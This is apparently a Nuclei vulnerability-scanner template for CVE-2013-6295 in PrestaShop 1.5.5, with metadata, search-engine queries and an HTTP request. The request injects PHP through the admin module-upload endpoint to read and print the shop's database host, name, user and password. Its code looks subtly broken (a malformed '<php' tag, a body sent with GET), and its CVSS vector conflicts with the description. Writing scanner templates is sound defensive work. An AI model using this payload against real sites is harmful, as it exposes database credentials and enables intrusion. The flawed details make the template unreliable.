id: CVE-2013-6295

info:
  name: PrestaShop 1.5.5 Privilege Escalation via Module Upload
  author: ProjectDiscoveryAI
  severity: critical
  description: PrestaShop 1.5.5 vulnerable to privilege escalation via a Salesman account via upload module.
  impact: |
    Successful exploitation could lead to unauthorized access and potential compromise of the PrestaShop application.
  remediation: |
    Upgrade PrestaShop to a version that is not vulnerable to CVE-2013-6295.
  reference:
    - http://davidsopaslabs.blogspot.com/2013/10/how-salesman-could-hack-prestashop.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2013-6295
    cwe-id: CWE-269
    epss-score: 0.0112
    epss-percentile: 0.85204
    cpe: cpe:2.3:a:prestashop:prestashop:1.5.5.0:*:*:*:*:*:*:*
  metadata:
    vendor: prestashop
    product: prestashop
    shodan-query:
      - cpe:"cpe:2.3:a:prestashop:prestashop"
      - http.component:"prestashop"
      - http.title:"prestashop installation assistant"
    fofa-query: title="prestashop installation assistant"
    google-query: intitle:"prestashop installation assistant"

http:
  - method: GET
    path:
      - "{{BaseURL}}/admin/index.php?controller=AdminModules&addmodule"

    headers:
      Content-Type: "application/x-www-form-urlencoded"

    body: |
      module_name=index2.php&module_desc=<php include('../config/settings.inc.php'); echo 'DB Server: ' . _DB_SERVER_ . ' DB Name: ' . _DB_NAME_ . ' DB User: ' . _DB_USER_ . ' DB Pass: ' . _DB_PASSWD_ . ' DB Prefix: ' . _DB_PREFIX_; ?>
    matchers:
      - type: word
        words:
          - "DB Server:"
          - "DB Name:"
          - "DB User:"
          - "DB Pass:"
          - "DB Prefix:"
        condition: and
